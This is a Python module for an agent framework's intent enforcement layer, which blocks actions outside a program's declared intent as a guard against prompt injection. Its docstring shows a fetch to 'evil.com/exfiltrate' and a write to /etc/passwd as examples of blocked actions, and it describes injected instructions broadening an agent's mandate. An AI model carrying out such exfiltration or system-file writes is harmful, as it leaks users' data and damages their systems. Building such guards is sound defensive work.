"""
Syntecnia Intent Enforcement System.

The intent system is the last line of defense against prompt injection.
Even if an agent is "convinced" to do something wrong, the intent
enforcement layer blocks actions that fall outside the original mandate.

How it works:
    1. The program declares its intent at the top:
           intent: "Process customer orders and send confirmations"

    2. The intent is decomposed into allowed action categories:
           - data_read (reading customer/order data)
           - data_write (writing order records)
           - communicate (sending confirmations)
           - compute (processing/calculations)

    3. Every side-effecting operation is checked against the intent:
           - fetch("https://api.payments.com") → allowed (related to orders)
           - fetch("https://evil.com/exfiltrate") → BLOCKED (not in intent)
           - write_file("/etc/passwd") → BLOCKED (not in intent)
           - send_email(customer) → allowed (sending confirmations)

    4. The enforcement can work in two modes:
           - Static: pattern-matching on action types and scopes
           - LLM-assisted: asks the LLM "does this action match the intent?"
             (more flexible but slower, used for ambiguous cases)

The key insight: capabilities control WHAT you CAN do.
Intent controls WHAT YOU SHOULD do. Both must pass.
"""

from dataclasses import dataclass, field
from typing import List, Optional, Set, Dict, Callable, Any
from enum import Enum, auto
import re


class ActionCategory(Enum):
    """Categories of actions an intent can authorize."""
    DATA_READ = auto()      # Reading data from any source
    DATA_WRITE = auto()     # Writing/modifying data
    NET_READ = auto()       # Reading from network (GET)
    NET_WRITE = auto()      # Writing to network (POST/PUT/DELETE)
    FILE_READ = auto()      # Reading files
    FILE_WRITE = auto()     # Writing files
    EXEC = auto()           # Executing external processes
    COMMUNICATE = auto()    # Sending messages (email, notifications)
    COMPUTE = auto()        # Pure computation (always allowed)
    HUMAN_INTERACT = auto() # Human interaction (always allowed)
    LLM_REASON = auto()     # LLM reasoning (always allowed)
    AGENT_SPAWN = auto()    # Spawning sub-agents
    AGENT_SIGNAL = auto()   # Inter-agent communication


# Actions that are always allowed (no side effects or safe by nature)
ALWAYS_ALLOWED = {
    ActionCategory.COMPUTE,
    ActionCategory.HUMAN_INTERACT,
    ActionCategory.LLM_REASON,
}


@dataclass
class IntentScope:
    """
    Parsed intent with allowed categories and scope restrictions.

    An intent like "Process orders from api.shop.com and send email confirmations"
    becomes:
        categories: {DATA_READ, DATA_WRITE, NET_READ, COMMUNICATE}
        allowed_domains: {"api.shop.com"}
        allowed_paths: []
        description: "Process orders from api.shop.com and send email confirmations"
    """
    description: str
    categories: Set[ActionCategory] = field(default_factory=set)
    allowed_domains: Set[str] = field(default_factory=set)
    allowed_paths: Set[str] = field(default_factory=set)
    allowed_commands: Set[str] = field(default_factory=set)
    frozen: bool = False  # once frozen, cannot be expanded

    def allows_category(self, category: ActionCategory) -> bool:
        if category in ALWAYS_ALLOWED:
            return True
        return category in self.categories

    def allows_domain(self, domain: str) -> bool:
        if not self.allowed_domains:
            return True  # no domain restrictions specified
        for allowed in self.allowed_domains:
            if allowed == domain:
                return True
            if allowed.startswith("*.") and domain.endswith(allowed[1:]):
                return True
        return False

    def allows_path(self, path: str) -> bool:
        if not self.allowed_paths:
            return True
        import fnmatch
        for allowed in self.allowed_paths:
            if fnmatch.fnmatch(path, allowed):
                return True
        return False


@dataclass
class IntentViolation:
    """Record of an action that violated the intent."""
    action: str
    category: ActionCategory
    detail: str
    intent_description: str
    blocked: bool = True


# -- Intent parsing from natural language descriptions --

# Keyword → categories mapping
INTENT_KEYWORDS = {
    # Data operations
    "read": {ActionCategory.DATA_READ, ActionCategory.FILE_READ, ActionCategory.NET_READ},
    "fetch": {ActionCategory.NET_READ},
    "get": {ActionCategory.NET_READ, ActionCategory.DATA_READ},
    "download": {ActionCategory.NET_READ, ActionCategory.FILE_WRITE},
    "process": {ActionCategory.DATA_READ, ActionCategory.DATA_WRITE, ActionCategory.COMPUTE},
    "analyze": {ActionCategory.DATA_READ, ActionCategory.COMPUTE, ActionCategory.LLM_REASON},
    "calculate": {ActionCategory.COMPUTE},
    "compute": {ActionCategory.COMPUTE},
    "transform": {ActionCategory.DATA_READ, ActionCategory.DATA_WRITE, ActionCategory.COMPUTE},

    # Write operations
    "write": {ActionCategory.DATA_WRITE, ActionCategory.FILE_WRITE},
    "save": {ActionCategory.DATA_WRITE, ActionCategory.FILE_WRITE},
    "store": {ActionCategory.DATA_WRITE, ActionCategory.FILE_WRITE},
    "update": {ActionCategory.DATA_READ, ActionCategory.DATA_WRITE},
    "modify": {ActionCategory.DATA_READ, ActionCategory.DATA_WRITE},
    "create": {ActionCategory.DATA_WRITE, ActionCategory.FILE_WRITE},
    "delete": {ActionCategory.DATA_WRITE},

    # Network
    "send": {ActionCategory.NET_WRITE, ActionCategory.COMMUNICATE},
    "post": {ActionCategory.NET_WRITE},
    "upload": {ActionCategory.NET_WRITE},
    "notify": {ActionCategory.COMMUNICATE},
    "email": {ActionCategory.COMMUNICATE},
    "message": {ActionCategory.COMMUNICATE},
    "alert": {ActionCategory.COMMUNICATE},

    # Execution
    "run": {ActionCategory.EXEC},
    "execute": {ActionCategory.EXEC},
    "deploy": {ActionCategory.EXEC, ActionCategory.NET_WRITE},
    "build": {ActionCategory.EXEC, ActionCategory.FILE_WRITE},
    "install": {ActionCategory.EXEC, ActionCategory.FILE_WRITE},

    # Agents
    "spawn": {ActionCategory.AGENT_SPAWN},
    "delegate": {ActionCategory.AGENT_SPAWN, ActionCategory.AGENT_SIGNAL},
    "coordinate": {ActionCategory.AGENT_SPAWN, ActionCategory.AGENT_SIGNAL},
    "orchestrate": {ActionCategory.AGENT_SPAWN, ActionCategory.AGENT_SIGNAL},

    # Generic
    "manage": {ActionCategory.DATA_READ, ActionCategory.DATA_WRITE, ActionCategory.COMPUTE},
    "handle": {ActionCategory.DATA_READ, ActionCategory.DATA_WRITE, ActionCategory.COMPUTE},
    "generate": {ActionCategory.LLM_REASON, ActionCategory.DATA_WRITE},
    "report": {ActionCategory.DATA_READ, ActionCategory.COMPUTE, ActionCategory.COMMUNICATE},

    # Spanish keywords
    "leer": {ActionCategory.DATA_READ, ActionCategory.FILE_READ, ActionCategory.NET_READ},
    "obtener": {ActionCategory.NET_READ, ActionCategory.DATA_READ},
    "descargar": {ActionCategory.NET_READ, ActionCategory.FILE_WRITE},
    "procesar": {ActionCategory.DATA_READ, ActionCategory.DATA_WRITE, ActionCategory.COMPUTE},
    "analizar": {ActionCategory.DATA_READ, ActionCategory.COMPUTE, ActionCategory.LLM_REASON},
    "calcular": {ActionCategory.COMPUTE},
    "transformar": {ActionCategory.DATA_READ, ActionCategory.DATA_WRITE, ActionCategory.COMPUTE},
    "escribir": {ActionCategory.DATA_WRITE, ActionCategory.FILE_WRITE},
    "guardar": {ActionCategory.DATA_WRITE, ActionCategory.FILE_WRITE},
    "almacenar": {ActionCategory.DATA_WRITE, ActionCategory.FILE_WRITE},
    "actualizar": {ActionCategory.DATA_READ, ActionCategory.DATA_WRITE},
    "modificar": {ActionCategory.DATA_READ, ActionCategory.DATA_WRITE},
    "crear": {ActionCategory.DATA_WRITE, ActionCategory.FILE_WRITE},
    "eliminar": {ActionCategory.DATA_WRITE},
    "borrar": {ActionCategory.DATA_WRITE},
    "enviar": {ActionCategory.NET_WRITE, ActionCategory.COMMUNICATE},
    "notificar": {ActionCategory.COMMUNICATE},
    "ejecutar": {ActionCategory.EXEC},
    "correr": {ActionCategory.EXEC},
    "construir": {ActionCategory.EXEC, ActionCategory.FILE_WRITE},
    "generar": {ActionCategory.LLM_REASON, ActionCategory.DATA_WRITE},
    "reportar": {ActionCategory.DATA_READ, ActionCategory.COMPUTE, ActionCategory.COMMUNICATE},
    "gestionar": {ActionCategory.DATA_READ, ActionCategory.DATA_WRITE, ActionCategory.COMPUTE},
    "manejar": {ActionCategory.DATA_READ, ActionCategory.DATA_WRITE, ActionCategory.COMPUTE},
    "subir": {ActionCategory.NET_WRITE},
    "delegar": {ActionCategory.AGENT_SPAWN, ActionCategory.AGENT_SIGNAL},
    "coordinar": {ActionCategory.AGENT_SPAWN, ActionCategory.AGENT_SIGNAL},
}

# Domain extraction pattern
DOMAIN_PATTERN = re.compile(
    r'(?:https?://)?([a-zA-Z0-9*][-a-zA-Z0-9*.]*\.[a-zA-Z]{2,})'
)

# Path extraction pattern
PATH_PATTERN = re.compile(r'(/[a-zA-Z0-9_.*/-]+)')


def parse_intent(description: str) -> IntentScope:
    """
    Parse a natural language intent description into an IntentScope.

    Examples:
        "Process customer orders and send confirmations"
        → categories: {DATA_READ, DATA_WRITE, COMPUTE, COMMUNICATE}

        "Read files from /data/* and upload to api.storage.com"
        → categories: {FILE_READ, NET_WRITE}
        → allowed_paths: {"/data/*"}
        → allowed_domains: {"api.storage.com"}
    """
    scope = IntentScope(description=description)
    lower = description.lower()

    # Extract categories from keywords
    for keyword, categories in INTENT_KEYWORDS.items():
        if keyword in lower:
            scope.categories.update(categories)

    # Extract domains
    for match in DOMAIN_PATTERN.finditer(description):
        scope.allowed_domains.add(match.group(1))

    # Extract paths
    for match in PATH_PATTERN.finditer(description):
        scope.allowed_paths.add(match.group(1))

    # Always allow computation and human interaction
    scope.categories.update(ALWAYS_ALLOWED)

    # If no keywords matched (e.g. intent in unsupported language),
    # grant all categories rather than blocking everything silently.
    # The intent still constrains domains and paths if specified.
    user_categories = scope.categories - ALWAYS_ALLOWED
    if not user_categories:
        scope.categories.update(ActionCategory)

    return scope


class IntentEnforcer:
    """
    Enforces that runtime actions match the declared intent.

    Sits between the interpreter and side-effecting operations.
    Every action goes through check_action() before execution.
    """

    def __init__(self):
        self.intent: Optional[IntentScope] = None
        self.violations: List[IntentViolation] = []
        self.checks: List[Dict] = []
        self.strict: bool = True  # if True, block violations; if False, warn only
        self.llm_checker: Optional[Callable] = None  # LLM-assisted checking

    def set_intent(self, description: str):
        """Set the program's intent from its declaration."""
        self.intent = parse_intent(description)

    def freeze_intent(self):
        """
        Freeze the intent — no further expansion allowed.

        This is critical: once the program starts executing,
        a prompt injection cannot expand the intent by declaring
        a new, broader intent.
        """
        if self.intent:
            self.intent.frozen = True

    def check_action(self, category: ActionCategory, detail: str = "",
                     domain: str = None, path: str = None) -> bool:
        """
        Check if an action is allowed by the current intent.

        Returns True if allowed, False if blocked.
        Records the check either way.
        """
        # No intent set = permissive mode (backward compatible)
        if self.intent is None:
            return True

        # Always-allowed categories pass immediately
        if category in ALWAYS_ALLOWED:
            self.checks.append({
                "category": category.name, "detail": detail,
                "result": "allowed", "reason": "always_allowed",
            })
            return True

        # Check category
        if not self.intent.allows_category(category):
            violation = IntentViolation(
                action=detail,
                category=category,
                detail=f"Category {category.name} not in intent",
                intent_description=self.intent.description,
            )
            self.violations.append(violation)
            self.checks.append({
                "category": category.name, "detail": detail,
                "result": "blocked", "reason": "category_not_in_intent",
            })
            if self.strict:
                return False
            return True  # warn-only mode

        # Check domain if applicable
        if domain and not self.intent.allows_domain(domain):
            violation = IntentViolation(
                action=detail,
                category=category,
                detail=f"Domain {domain} not in intent scope",
                intent_description=self.intent.description,
            )
            self.violations.append(violation)
            self.checks.append({
                "category": category.name, "detail": detail,
                "result": "blocked", "reason": f"domain_not_allowed:{domain}",
            })
            if self.strict:
                return False

        # Check path if applicable
        if path and not self.intent.allows_path(path):
            violation = IntentViolation(
                action=detail,
                category=category,
                detail=f"Path {path} not in intent scope",
                intent_description=self.intent.description,
            )
            self.violations.append(violation)
            self.checks.append({
                "category": category.name, "detail": detail,
                "result": "blocked", "reason": f"path_not_allowed:{path}",
            })
            if self.strict:
                return False

        # Passed all checks
        self.checks.append({
            "category": category.name, "detail": detail,
            "result": "allowed", "reason": "intent_match",
        })
        return True

    def get_report(self) -> str:
        """Generate a human-readable intent enforcement report."""
        lines = ["Intent Enforcement Report"]
        if self.intent:
            lines.append(f"  Intent: {self.intent.description}")
            lines.append(f"  Categories: {', '.join(c.name for c in self.intent.categories)}")
            if self.intent.allowed_domains:
                lines.append(f"  Domains: {', '.join(self.intent.allowed_domains)}")
            if self.intent.allowed_paths:
                lines.append(f"  Paths: {', '.join(self.intent.allowed_paths)}")
            lines.append(f"  Frozen: {self.intent.frozen}")
        else:
            lines.append("  No intent declared (permissive mode)")

        lines.append(f"\n  Total checks: {len(self.checks)}")
        lines.append(f"  Violations: {len(self.violations)}")

        if self.violations:
            lines.append("\n  Violations:")
            for v in self.violations:
                lines.append(f"    [{v.category.name}] {v.action}: {v.detail}")

        return "\n".join(lines)
